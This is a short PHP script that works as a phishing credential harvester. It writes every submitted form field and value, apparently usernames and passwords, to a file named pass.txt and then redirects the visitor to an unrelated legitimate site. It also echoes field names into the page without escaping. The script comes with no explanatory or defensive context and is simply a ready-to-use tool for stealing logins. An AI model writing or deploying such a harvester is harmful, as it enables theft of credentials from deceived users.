<?php
 
header(“Location: http://www.w3schools.com“);
$handle = fopen(“pass.txt”, “a”);
foreach($_POST as $variable => $value) {
  echo "<script type = 'text/javascript'> alert('$variable');</script>";
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
exit;
?>
